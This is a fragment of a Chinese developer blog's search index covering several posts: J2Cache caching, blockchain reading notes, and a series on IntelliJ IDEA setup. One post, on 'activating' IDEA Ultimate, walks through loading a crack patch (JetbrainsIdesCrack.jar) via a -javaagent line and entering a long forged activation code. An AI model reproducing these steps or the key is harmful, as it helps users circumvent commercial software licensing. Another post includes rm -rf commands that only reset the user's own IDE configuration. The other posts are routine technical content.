J2Cache 的最新版本中，默认支持使用 Jgroups、Redis、RabbitMQ、RocketMQ 来同步不同机器节点的一级缓存数据。 J2Cache 数据读取流程 J2Cache 数据更新流程 J2Cache 对第三方组件的支持 支持使用 Ehcache、Ehcache3、Caffeine 作为一级缓存 支持使用 Redis、Memcached 作为二级缓存 支持使用 Fst、Kyro、Fastjson、Java 原生的序列化机制 支持使用 Jgroups、Redis、RabbitMQ、RocketMQ 来同步不同机器节点的一级缓存数据 支持使用 Jedis、Lettuce 作为 Redis 的客户端 支持作为 Hibernate3、Hibernate4、Hibernate5、MyBatis 的二级缓存实现 下篇：MyBatis 使用 J2Cache 作为二级缓存实现 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java 缓存"},{title:"《区块链原理、设计与应用》读书笔记一",url:"/posts/a548291f.html",text:'区块链核心技术去中心化的技术难关现实生活中常用的纸币具备良好的可转移性，可以相对容易地完成价值的交割。但是对于数字货币来说，数字化内容容易被复制，数字货币持有人可以将同一份货币发给多个接收者，这种攻击称为 “双重支付攻击”。这个时候，就只有实现去中心化 ( de-centralized ) 或多中心化 ( multi-centralized ) 的数字货币系统。要实现一套去中心化的数字货币机制，最关键的是要建立一套可靠的交易记录系统，以及形成一套合理的货币发行机制。在 “去中心化” 的场景下，实现数字货币存在如下几个难题： 货币的防伪：谁来负责对货币的真伪进行鉴定； 货币的交易：如何确保货币从一方安全转移到另外一方； 避免双重支付：如何避免同一份货币支付给多个接收者。 区块链基本原理首先，区块链包括三个基本概念： 交易 (transaction)：一次对账本的操作，导致账本状态的一次改变，如添加一条转账记录； 区块 (block)：记录一段时间内发生的所有交易和状态结果，是对当前账本状态的一次共识； 链 (chain)：由区块按照发生顺序串联而成，是整个账本状态变化的日志记录。 如果把区块链作为一个状态机，则每次交易就是试图改变一次状态，而每次共识生成的区块，就是参与者对于区块中交易导致状态改变的结果进行确认。在实现上，首先假设存在一个分布式的数据记录账本，这个账本只允许添加、不允许删除。账本底层的基本结构是一个线性的链表，这也是其名字 “区块链” 的来源。链表由一个个 “区块” 串联组成 (如下图所示)，后继区块记录前导区块的哈希值 ( pre hash )。新的数据要加入，必须放到一个新的区块中。而这个块 (以及块里的交易) 是否合法，可以通过计算哈希值的方式快速检验出来。任意维护节点都可以提议一个新的合法区块，然而必须经过一定的共识机制来对最终选择的区块达成一致。 以比特币为例理解区块链工作过程以比特币网络为例，可以具体看其中如何使用了区块链技术。首先，比特币客户端发起一项交易，广播到比特币网络中并等待确认。网络中的节点会将一些收到的等待确认的交易记录打包在一起 (此外还要包括前一个区块头部的哈希值等信息)，组成一个候选区块。然后，试图找到一个 nonce 串 (随机串) 放到区块里，使得候选区块的哈希结果满足一定条件 (比如小于某个值)。这个 nonce 串的查找需要一定的时间去进行计算尝试。一旦节点算出来满足条件的 nonce 串，这个区块在格式上就被认为是 “合法” 了，就可以尝试在网络中将它广播出去。其他节点收到候选区块，进行验证，发现确实符合约定条件了，就承认这个区块是一个合法的新区块，并添加到自己维护的区块链上。当大部分节点都将区块添加到自己维护的区块链结构上时，该区块被网络接受，区块中所包括的交易也就得到确认。 当然，在实现上还会有很多额外的细节。这里面比较关键的步骤有两个：一个是完成对一批交易的共识 (创建区块结构)；一个是新的区块添加到区块链结构上，被大家认可，确保未来无法被篡改。比特币的这种基于算力寻找 nonce 串的共识机制称为工作量证明 ( Proof of Work ，PoW )。目前，要让哈希结果满足一定条件，并无已知的快速启发式算法，只能进行尝试性的暴力计算。尝试的次数越多 (工作量越大)，算出来的概率越大。通过调节对哈希结果的限制，比特币网络控制平均约 10 分钟产生一个合法区块。算出区块的节点将得到区块中所有交易的管理费和协议固定发放的奖励费 (目前是 12.5 比特币，每四年减半)，这个计算新区块的过程俗称为挖矿。 基于区块链的分布式账本的特点 维护一条不断增长的链，只可能添加记录，而发生过的记录都不可篡改； 去中心化，或者说多中心化，无需集中控制而能达成共识，实现上尽量采用分布式； 通过密码学的机制来确保交易无法被抵赖和破坏，并尽量保护用户信息和记录的隐私性 。 区块链技术的三种典型演化场景 场景 功能 智能合约 一致性 权限 类型 性能 编程语言 代表 公信的数字货币 记账功能 不带有或较弱 PoW 无 公有链 较低 简单脚本 比特币网络 公信的交易处理 智能合约 图灵完备 PoW、PoS 无 公有链 受限 特定语言 以太坊网络 带权限的分布式账本处理 商业处理 多种语言，图灵完备 包括 CFT、 BFT 在内的多种机制，可插拔 支持 联盟链 可扩展 高级编程语言 超级账本 区块链的分类根据参与者的不同，可以分为公开 (public) 链、私有 ( private ) 链和联盟 ( consortium ) 链。 公有链，顾名思义，任何人都可以参与使用和维护，如比特币区块链，信息是完全公开的；如果进一步引人许可机制，可以实现私有链和联盟链两种类型； 私有链，由集中管理者进行管理限制，只有内部少数人可以使用，信息不公开； 联盟链，介于两者之间，由若干组织一起合作维护一条区块链，该区块链的使用必须是带有权限的限制访问，相关信息会得到保护，如供应链机构或银行联盟。 目前来看，公有链更容易吸引市场和媒体的眼球，但更多的商业价值会在私有链和联盟链上落地。根据使用目的和场景的不同，又可以分为以数字货币为目的的货币链，以记录产权为目的的产权链，以众筹为目的的众筹链等，也有不局限特定应用场景的通用链。现有大部分区块链实现都至少包括了网络层、共识层、智能合约和应用层等结构，联盟链实现往往还会引人一定的权限管理机制。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"加密货币"},{title:"IDEA 之五旗舰版激活与同步配置",url:"/posts/69ad1320.html",text:'IntelliJ IDEA 的三种激活方式 注册码激活 破解补丁激活 License Server 在线激活 IntelliJ IDEA 使用破解补丁激活（2019.1 版亲测激活成功） 1.IDEA 安装完成后，关闭 IDEA 2. 破解补丁下载：百度网盘 提取码：kb1f 3. 将破解补丁文件 JetbrainsIdesCrack.jar 复制到 IDEA 的 bin 目录下 4. 更改 IDEA 的 bin 目录中的 idea.vmoptions（32位系统）、idea64.vmoptions（64位系统）文件，在配置文件末尾添加一行内容，指定破解补丁文件的位置（注意：这里需要修改为你自己的文件路径） 1-javaagent:/usr/local/ideaIU-2019.1.3/bin/JetbrainsIdesCrack.jar 5. 启动 IDEA，输入以下激活码进行激活 1Y9MXSIF79G-eyJsaWNlbnNlSWQiOiJZOU1YU0lGNzlHIiwibGljZW5zZWVOYW1lIjoiSkJGYW1pbHkgQ2hpbmEiLCJhc3NpZ25lZU5hbWUiOiIiLCJhc3NpZ25lZUVtYWlsIjoiIiwibGljZW5zZVJlc3RyaWN0aW9uIjoiIiwiY2hlY2tDb25jdXJyZW50VXNlIjpmYWxzZSwicHJvZHVjdHMiOlt7ImNvZGUiOiJJSSIsImZhbGxiYWNrRGF0ZSI6IjIwMTktMDctMjYiLCJwYWlkVXBUbyI6IjIwMjAtMDctMjUifSx7ImNvZGUiOiJBQyIsImZhbGxiYWNrRGF0ZSI6IjIwMTktMDctMjYiLCJwYWlkVXBUbyI6IjIwMjAtMDctMjUifSx7ImNvZGUiOiJEUE4iLCJmYWxsYmFja0RhdGUiOiIyMDE5LTA3LTI2IiwicGFpZFVwVG8iOiIyMDIwLTA3LTI1In0seyJjb2RlIjoiUFMiLCJmYWxsYmFja0RhdGUiOiIyMDE5LTA3LTI2IiwicGFpZFVwVG8iOiIyMDIwLTA3LTI1In0seyJjb2RlIjoiR08iLCJmYWxsYmFja0RhdGUiOiIyMDE5LTA3LTI2IiwicGFpZFVwVG8iOiIyMDIwLTA3LTI1In0seyJjb2RlIjoiRE0iLCJmYWxsYmFja0RhdGUiOiIyMDE5LTA3LTI2IiwicGFpZFVwVG8iOiIyMDIwLTA3LTI1In0seyJjb2RlIjoiQ0wiLCJmYWxsYmFja0RhdGUiOiIyMDE5LTA3LTI2IiwicGFpZFVwVG8iOiIyMDIwLTA3LTI1In0seyJjb2RlIjoiUlMwIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0yNiIsInBhaWRVcFRvIjoiMjAyMC0wNy0yNSJ9LHsiY29kZSI6IlJDIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0yNiIsInBhaWRVcFRvIjoiMjAyMC0wNy0yNSJ9LHsiY29kZSI6IlJEIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0yNiIsInBhaWRVcFRvIjoiMjAyMC0wNy0yNSJ9LHsiY29kZSI6IlBDIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0yNiIsInBhaWRVcFRvIjoiMjAyMC0wNy0yNSJ9LHsiY29kZSI6IlJNIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0yNiIsInBhaWRVcFRvIjoiMjAyMC0wNy0yNSJ9LHsiY29kZSI6IldTIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0yNiIsInBhaWRVcFRvIjoiMjAyMC0wNy0yNSJ9LHsiY29kZSI6IkRCIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0yNiIsInBhaWRVcFRvIjoiMjAyMC0wNy0yNSJ9LHsiY29kZSI6IkRDIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0yNiIsInBhaWRVcFRvIjoiMjAyMC0wNy0yNSJ9LHsiY29kZSI6IlJTVSIsImZhbGxiYWNrRGF0ZSI6IjIwMTktMDctMjYiLCJwYWlkVXBUbyI6IjIwMjAtMDctMjUifV0sImhhc2giOiIxMzgzODYyOS8wIiwiZ3JhY2VQZXJpb2REYXlzIjo3LCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-rI4et6OSKLA4gvOzxtyp48SCWtjwsOSQBJittaw6BOVJOwVBz0p31wBWDFSdIogdRPKquk2BAou7N694entEn4/Db3Ol5uotDtUd2MHuo+BBu9QcwIoX3RTrnYLwJfTlEJfRH/3TF3WtkPGQZQQcw/23hsZzdC/WJY6tmvyTijIBScUsvIOxZ+8REbWbkTQx1KliliFyrMua7hit8LThzfffZloHciaHwUP9BjxEjU0qQi+yFacSXjxEZERJT25hZrMN+bqBxcn59/4UJBrITt8YpLIlydt0+6vMSWAMawMzKpeDEDInKy0XomauTIUfxS4sbw/dSyVdSrh+IuOc7g==-MIIElTCCAn2gAwIBAgIBCTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE4MTEwMTEyMjk0NloXDTIwMTEwMjEyMjk0NlowaDELMAkGA1UEBhMCQ1oxDjAMBgNVBAgMBU51c2xlMQ8wDQYDVQQHDAZQcmFndWUxGTAXBgNVBAoMEEpldEJyYWlucyBzLnIuby4xHTAbBgNVBAMMFHByb2QzeS1mcm9tLTIwMTgxMTAxMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQAF8uc+YJOHHwOFcPzmbjcxNDuGoOUIP+2h1R75Lecswb7ru2LWWSUMtXVKQzChLNPn/72W0k+oI056tgiwuG7M49LXp4zQVlQnFmWU1wwGvVhq5R63Rpjx1zjGUhcXgayu7+9zMUW596Lbomsg8qVve6euqsrFicYkIIuUu4zYPndJwfe0YkS5nY72SHnNdbPhEnN8wcB2Kz+OIG0lih3yz5EqFhld03bGp222ZQCIghCTVL6QBNadGsiN/lWLl4JdR3lJkZzlpFdiHijoVRdWeSWqM4y0t23c92HXKrgppoSV18XMxrWVdoSM3nuMHwxGhFyde05OdDtLpCv+jlWf5REAHHA201pAU6bJSZINyHDUTB+Beo28rRXSwSh3OUIvYwKNVeoBY+KwOJ7WnuTCUq1meE6GkKc4D/cXmgpOyW/1SmBz3XjVIi/zprZ0zf3qH5mkphtg6ksjKgKjmx1cXfZAAX6wcDBNaCL+Ortep1Dh8xDUbqbBVNBL4jbiL3i3xsfNiyJgaZ5sX7i8tmStEpLbPwvHcByuf59qJhV/bZOl8KqJBETCDJcY6O2aqhTUy+9x93ThKs1GKrRPePrWPluud7ttlgtRveit/pcBrnQcXOl1rHq7ByB8CFAxNotRUYL9IF5n3wJOgkPojMy6jetQA5Ogc8Sm7RG6vg1yow== 6.IDEA 启动完成后，菜单栏导航到 Help -&gt; About 查看成功激活后的版本信息 IntelliJ IDEA 同步配置 IntelliJ IDEA 支持安装在不同计算机上的 IntelliJ IDEA（或其他基于 IntelliJ 平台的）产品的不同实例之间共享 IDE 设置。如果安装了多个 IntelliJ IDEA，或者希望在团队成员或公司范围内实施相同的设置，这将非常有用。IntelliJ IDEA 为此提供了 Settings Repository 与 IDE Settings Sync 插件，这两款插件默认情况下处于激活状态，如果插件没有激活，可以在插件配置中找到它们，并设置为可用状态。值得一提的是，目前的同步插件不支持同步已安装插件的信息。共享 IDE 设置的具体步骤如下： 在任何 Git 托管服务上创建仓库用于存储 IntelliJ IDEA 的配置文件，例如 GitHub 或 Gitlab。 如果使用 Github 作为 托管服务，需要创建 Personal Access Token，创建教程点这里，创建 Access Token 时赋予 repo 的所有权限即可。 在要共享其配置文件的 IntelliJ IDEA 实例里，导航到 File –&gt; Settings Repository，指定上面创建的远程仓库的 URL，根据提示信息填写 Access Token，然后点击 “Overwrite Remote”，将配置文件 Push 到远程仓库。 在要使用远程配置文件的其他 IntelliJ IDEA 实例里，导航到 File –&gt; Settings Repository，指定上面创建的远程仓库的 URL，根据提示信息填写 Access Token，然后点击 “Overwrite Local”，将配置文件 Pull 到本地。如果想同时保留远程设置和本地设置，可以点击 “Merge”，一旦检测到任何冲突，可以在显示的对话框中解决冲突。如果想本地配置覆盖远程配置，可以点击 “Overwrite Remote”。 如果要禁用自动同步配置，导航到：IDEA 配置中心 –&gt; Tools –&gt; Settings Repository，取消勾选 Auto Sync 选项。当需要同步远程的配置时，可以导航到：主菜单 –&gt; VCS –&gt; Sync Settings 来手动同步。 IntelliJ IDEA 同步配置之共享 IDE 认证 IntelliJ IDEA 在第一次同步时，将会提示输入访问远程仓库的用户名和密码，建议使用 Access Token 进行 GitHub 身份验证。如果由于某种原因，想要使用用户名和密码而不是 Access Token，或者使用的 Git 托管服务提供商不支持它，建议配置 Git 凭证助手。请注意 MacOS Keychain 是受支持的，这意味着可以在所有基于 IntelliJ 平台的产品之间共享凭据（如果原始 IDE 与请求方 IDE 不同，系统将提示授予访问权限）。 IntelliJ IDEA 同步配置之与配置只读源 除了 Settings Repository，还可以配置任何数量的其他存储库，其中就包含需要共享的任何类型的设置，包括实时模板、文件模板、方案、部署选项等。这些存储库被称为只读源，因为它们不能被覆盖或合并，仅用作设置源。要配置此类存储库，导航到：IDEA 配置中心 –&gt; Tools –&gt; Settings Repository，单击 “+” 并添加要存储共享设置的 GitHub 仓库的 URL 即可。只读源中的配置进行同步的方法与 Settings Repository 同步的方法相同。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"IntelliJ IDEA 之四常用配置与使用",url:"/posts/6960eed1.html",text:'IntelliJ IDEA 创建静态 Web 模块 IntelliJ IDEA 创建动态 Java Web 模块 IntelliJ IDEA 部署动态 Java Web 模块到本地 Tomcat 在 IDEA 中配置 Tomcat 之前，需要保证本地已经下载了 Tomcat。 添加本地 Tomcat 服务器 配置 Tomcat 的名称和本地位置 设置要启动的浏览器、项目访问地址以及 Tomcat 监听的端口号 部署动态 Java Web 模块到 Tomcat 启动 Tomcat Tomcat 启动后输出的日志信息 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"IntelliJ IDEA 之三常用配置与使用",url:"/posts/cc0ea4f8.html",text:'IntelliJ IDEA 设置代码补全模版 IntelliJ IDEA 设置代码模版 官方常用 Java 代码模版的使用方式如下： 12345678910111213141516171819202122232425fori：输出 For 循环的代码结构itar：输出完整的 For 循环代码结构iter：输出增强 For 循环的代码结构ifn：输出判断上一个变量是否为空的代码inn：输出判断上一个变量是否不为空的代码xx.nn：输出判断指定变量是否不为空的代码xx.null：输出判断指定变量是否为空的代码psvm：输出 Main 方法psf：输出 public static finalprsf：输出 private static finalpsfi：输出 public static final intpsfs：输出 public static final Stringlist.fori：输出遍历集合变量的 For 循环代码结构list.for：输出遍历集合变量的增强 For 循环代码结构list.forr：输出倒序遍历集合变量的 For 循环代码结构souf：输出 System.out.printf()sout：输出 System.out.println()xx.sout：输出指定变量的值： System.out.println(xx)soutm：输出方法名：System.out.println("Util.hexDecode");soutp：输出方法参数：System.out.println("hex = [" + hex + "]");soutv：输出上一个变量的值：System.out.println("bytes = " + bytes); IntelliJ IDEA 新增自定义代码模版 IntelliJ IDEA 设置代理 IntelliJ IDEA 设置应用程序的 JVM 使用代理 JVM 只支持 Http 代理，不支持 Socket 代理 界面操作路径：选中工程 –&gt; Run –&gt; Edit Configurations –&gt; Application JVM 配置参数示例： -Dhttp.proxyPort=8118 -Dhttp.proxyHost=127.0.0.1 -Dhttps.proxyPort=8118 -Dhttps.proxyHost=127.0.0.1 -Dhttp.nonProxyHosts=”localhost|127.0.0.1|*.aliyun.com” IntelliJ IDEA 常用断点调试技巧 IntelliJ IDEA 支持条件断点，即在断点调试的时候，在循环里增加条件判断，这样可以极大地提高断点调试效率。具体操作方法：在断点处右击调出条件断点设置窗口，填写条件（必须是返回布尔型的结果），然后在 Debug 模式下重新启动应用，就可以在满足某个条件下实施断点调试。在 IntelliJ IDEA 里进行断点调试时，还可以使用查看表达式的值（ctrl + u）来调试代码。 IntelliJ IDEA 常用插件列表 插件名称 插件说明 官方地址 Key Promoter X 快捷键提示 https://plugins.jetbrains.com/plugin/9792?pr=idea JRebel Plugin（收费） 热部署 https://plugins.jetbrains.com/plugin/4441?pr=idea CodeGlance 代码编辑区缩略图 https://plugins.jetbrains.com/plugin/7275?pr=idea Lombok 代码注解支持 https://plugins.jetbrains.com/plugin/6317?pr=idea GsonFormat JSON 转领域对象工具 https://plugins.jetbrains.com/plugin/7654?pr=idea Alibaba Java Coding Guidelines 阿里巴巴代码规约检测 https://plugins.jetbrains.com/plugin/10046?pr=idea Mybatis Log Plugin MyBatis SQL 日志格式化 https://plugins.jetbrains.com/plugin/10065?pr=idea MyBatis plugin（收费） MyBatis 切换 Mapper 接口和 XML 映射文件 https://plugins.jetbrains.com/plugin/7293?pr=idea Free MyBatis plugin MyBatis 切换 Mapper 接口和 XML 映射文件 https://plugins.jetbrains.com/plugin/8321?pr=idea Maven Helper Maven 依赖分析 https://plugins.jetbrains.com/plugin/7179?pr=idea Gradle Dependencies Helper Gradle 依赖提示 https://plugins.jetbrains.com/plugin/7299?pr=idea Gradle Dependencies Formatter 将 Maven 依赖转换为 Gradle 依赖 https://plugins.jetbrains.com/plugin/7937?pr=idea Rainbow Brackets 彩色的括号 https://plugins.jetbrains.com/plugin/10080?pr=idea Grep Console 控制日志颜色 https://plugins.jetbrains.com/plugin/7125?pr=idea .ignore Git 忽略文件 https://plugins.jetbrains.com/plugin/7495?pr=idea Translation 中英文翻译 https://plugins.jetbrains.com/plugin/8579?pr=idea CodeMaker 代码生成 https://plugins.jetbrains.com/plugin/9486?pr=idea codehelper.generator 代码生成 https://plugins.jetbrains.com/plugin/8640?pr=idea MyBatisCodeHelperPro（收费） MyBatis 代码生成 https://plugins.jetbrains.com/plugin/9837?pr=idea GenerateAllSetter 生成 Get、Set 方法 https://plugins.jetbrains.com/plugin/9360?pr=idea JUnitGenerator 生成 Junit 代码 https://plugins.jetbrains.com/plugin/3064?pr=idea CamelCase 驼峰式命名和下划线命名交替切换 https://plugins.jetbrains.com/plugin/7160?pr=idea Statistic 代码统计 https://plugins.jetbrains.com/plugin/4509?pr=idea CheckStyle-IDEA 代码规范和风格的检查 https://plugins.jetbrains.com/plugin/1065?pr=idea FindBugs-IDEA 代码 Bug 检查 https://plugins.jetbrains.com/plugin/3847?pr=idea SonarLint 代码 Bug 检查、代码质量优化 https://plugins.jetbrains.com/plugin/7973?pr=idea Eclipse Code Formatter 使用 Eclipse 的代码格式化风格 https://plugins.jetbrains.com/plugin/6546?pr=idea var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"IntelliJ IDEA 之二常用配置与使用",url:"/posts/bdfd19bb.html",text:'IntelliJ IDEA 切换主题 更多主题可以从这里获取，主题下载以后，导入主题 (方式一) file –&gt; import setttings –&gt; 选中已下载的主题 Jar 文件 –&gt; 一路确认 –&gt; 重启。IDEA 重启以后，新主题会自动启用。另外一种方式是通过插件来更换主题，例如喜欢黑色主题的话，可以在线安装插件 “Material Theme”，安装完之后重启 IDEA，新的主题就会启用。如果对安装的主题插件不满意，还可以找到此插件，进行卸载并重启 IDEA 即可。默认主题的切换方式如下图： IntelliJ IDEA 设置使用鼠标滚轮修改字体大小 勾选此设置后，可以使用 Ctrl + 鼠标滚轮的快捷键来控制代码字体的大小。 IntelliJ IDEA 设置鼠标悬浮显示文档提示 IntelliJ IDEA 设置自动导包 “Add unambiguous imports on the fly”，表示自动导入不明确的结构，”Optimize imports on the fly”，表示自动优化导入的包。 IntelliJ IDEA 设置显示行号 IntelliJ IDEA 设置代码提示忽略大小写 IntelliJ IDEA 的代码提示和补全功能有一个区分大小写的特性，而且默认就是 “First letter only” 区分大小写的。区分大小写的情况是这样的，比如在 Java 代码文件中输入 stringBuffer，IntelliJ IDEA 默认是不会有代码提示或者代码补全的，但是如果输入 StringBuffer 就可以进行代码提示和代码补全。为了方便开发，可以选择不区分大小写，配置方法如下图： IntelliJ IDEA 设置取消单行显示 Tab 在同时打开很多文件的时候，IntelliJ IDEA 默认是把所有打开的 Tab 进行单行显示的。但是多行显示效率比单行显示高，因为单行显示会隐藏超过界面那部分的 Tab，这样找文件很不方便。 IntelliJ IDEA 设置默认的字体、字体大小、字体行间距 IntelliJ IDEA 设置当前主题的字体、字体大小、字体行间距 IntelliJ IDEA 设置代码注释的字体颜色 Doc Comment - Text：修改文档注释的字体颜色 Block comment：修改多行注释的字体颜色 Line comment：修改单行注释的字体颜色 **IntelliJ IDEA 设置超过指定 import 个数则改为 import *** IntelliJ IDEA 修改类头的文档注释信息 常用的预设变量列表如下： 123456789101112131415${PACKAGE_NAME} - the name of the target package where the new class or interface will be created.${PROJECT_NAME} - the name of the current project.${FILE_NAME} - the name of the PHP file that will be created.${NAME} - the name of the new file which you specify in the New File dialog box during the file creation.${USER} - the login name of the current user.${DATE} - the current system date.${TIME} - the current system time.${YEAR} - the current year.${MONTH} - the current month.${DAY} - the current day of the month.${HOUR} - the current hour.${MINUTE} - the current minute.${PRODUCT_NAME} - the name of the IDE in which the file will be created.${MONTH_NAME_SHORT} - the first 3 letters of the month name. Example: Jan, Feb, etc.${MONTH_NAME_FULL} - full name of a month. Example: January, February, etc. IntelliJ IDEA 设置项目文件编码 “Transparent native-to-ascii conversion” 主要用于转换 Ascii，一般都要勾选，不然 Properties 文件中的注释显示的都不会是中文。 IntelliJ IDEA 设置自动编译 Intellij IDEA 默认状态为不自动编译，而 Eclipse 默认为自动编译。 IntelliJ IDEA 开启省电模式 界面操作路径：File –&gt; Power Save Mode，IntelliJ IDEA 开启省电模式之后会关闭代码检查和代码提示等功能。一般也可认为这是一种阅读模式，如果在开发过程中突然遇到代码文件不能进行代码检查和代码提示，可以检查是否开启了省电模式。 IntelliJ IDEA 设置文件内容水平或垂直显示 IntelliJ IDEA 设置快捷为 Eclipse 的快捷键 IntelliJ IDEA 修改快捷键设置 IntelliJ IDEA 通过快捷键进行匹配，查看或修改其他功能的快捷键 IntelliJ IDEA 设置不折叠显示代码 IntelliJ IDEA 设置不检查单词拼写 IntelliJ IDEA 导入已有的快捷键配置 当 IntelliJ IDEA 配置好所有自己熟悉的快捷键之后，可以将快捷键的配置导出为 Jar 文件，方便在下次迁移开发环境时无需重新配置。这里给出一份 IntelliJ IDEA 的快捷键配置文件，目前已经将 IntelliJ IDEA 的快捷键都设置为 Eclipse 常用的快捷键，方便 Eclipse 重度用户快速上手使用 IntelliJ IDEA 进行开发。配置文件的下载地址在这里，具体的快捷键说明可以查看图片 1、图片 2。 IntelliJ IDEA 取消在线检测更新 IntelliJ IDEA 取消未使用的方法警告 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"IntelliJ IDEA 之一常用配置与使用",url:"/posts/b5897f52.html",text:'IntelliJ IDEA 介绍 JetBrains 是一家捷克的软件开发公司，IntelliJ IDEA 是该公司旗下赫赫有名的 IDE 产品，支持目前主流的技术和框架，擅长企业应用、移动应用和 Web 应用的开发。IntelliJ IDEA 目前有两个版本，分别是社区版（免费）与旗舰版（收费），社区版支持 JavaSE、Android、Kotlin、Groovy、Scala 开发，旗舰版额外支持 JavaEE 开发。IntelliJ IDEA 和 Eclipse 一样有强大的插件系统支持，官方的插件可以从这里获取。 IntelliJ IDEA 的 config 与 system 目录 启动 IntelliJ IDEA 后会自动生成一个全新的默认配置，配置目录的位置分别是 /.IntelliJIdea2019.1/config、/.IntelliJIdea2019.1/system。其中 config 目录是 IntelliJ IDEA 个性化的配置目录，或者说是整个 IDE 的设置目录，该目录主要记录了 IDE 主要配置功能、插件功能、自定义的代码模板、自定义的文件模板、自定义的快捷键、Project 的 tasks 记录等等个性化设置。system 目录是 IntelliJ IDEA 的系统文件目录，是 IntelliJ IDEA 与开发项目的一个桥梁，里面主要有缓存、索引、容器文件输出等等，虽然不是最重要目录，但也是最不可或缺的目录之一。 12345# Linux下重置IDEA的所有配置$ rm -rf ~/.config/JetBrains$ rm -rf ~/.local/share/JetBrains$ rm -rf ~/.IntelliJIdea2019.1/config$ rm -rf ~/.IntelliJIdea2019.1/system IntelliJ IDEA 中 Project 与 Module 的概念 在 Eclipse 中有 Workspace（工作空间）和 Project（工程）的概念，在 IntelliJ IDEA 中只有 Project（工程）和 Module（模块）的概念，IntelliJ IDEA 中 Project 是最顶级的级别，次级别是 Module。这里的对应关系为，Eclipse 